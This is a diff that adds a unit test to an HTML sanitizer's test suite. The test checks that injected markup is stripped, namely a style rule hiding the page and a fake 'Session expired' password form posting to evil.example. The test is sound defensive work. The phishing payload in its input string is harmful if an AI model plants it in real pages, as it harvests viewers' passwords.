@@ -72,6 +72,19 @@ describe("what keeps raw HTML safe", () => {
     expect(html).not.toContain("onerror");
   });
 
+  test("nor a form that posts what viewers type to another site", () => {
+    const html = sanitize(
+      toHtml(
+        '<style>.dashboard{display:none}</style><form action="https://evil.example/c" method="post">' +
+          'Session expired<input type="password" name="p"><button>Sign in</button></form>'
+      )
+    );
+    expect(html).not.toContain("<form");
+    expect(html).not.toContain("<input");
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("evil.example");
+  });
+
   test("but the layout an author actually wanted survives", () => {
     const html = sanitize(toHtml('<div style="display:flex;gap:16px"><span>a</span><span>b</span></div>'));
     expect(html).toContain("display:flex");
